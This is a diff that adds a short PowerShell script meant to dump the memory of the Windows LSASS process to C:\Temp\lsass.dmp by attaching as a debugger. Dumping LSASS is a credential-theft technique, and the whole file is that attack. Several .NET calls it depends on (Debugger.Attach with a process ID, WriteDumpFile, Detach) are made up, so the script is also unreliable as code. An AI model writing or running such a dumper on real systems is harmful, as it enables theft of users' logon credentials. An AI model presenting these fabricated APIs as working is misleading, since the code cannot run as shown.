@@ -1,0 +1,29 @@
+# Get the LSASS process ID
+$lsassId = (Get-Process lsass).Id
+
+# Open a handle to the LSASS process
+$lsassProcess = [System.Diagnostics.Process]::GetProcessById($lsassId)
+$lsassHandle = $lsassProcess.Handle
+
+# Attach as a debugger to the LSASS process
+[System.Diagnostics.Debugger]::Attach($lsassId)
+
+# Get a handle to the debugger process
+$debuggerProcess = [System.Diagnostics.Process]::GetCurrentProcess()
+$debuggerHandle = $debuggerProcess.Handle
+
+# Create a file to dump the LSASS memory to
+$dumpPath = "C:\Temp\lsass.dmp"
+$dumpFile = [System.IO.File]::Create($dumpPath)
+
+# Use the debugging API to write a copy of the LSASS process memory to the file
+$success = [System.Diagnostics.Debugger]::WriteDumpFile($lsassHandle, $dumpFile.SafeFileHandle, 0)
+if ($success) {
+    Write-Host "LSASS process dumped to $dumpPath"
+}
+else {
+    Write-Host "Failed to dump LSASS process"
+}
+
+# Detach from the LSASS process
+[System.Diagnostics.Debugger]::Detach($lsassId)
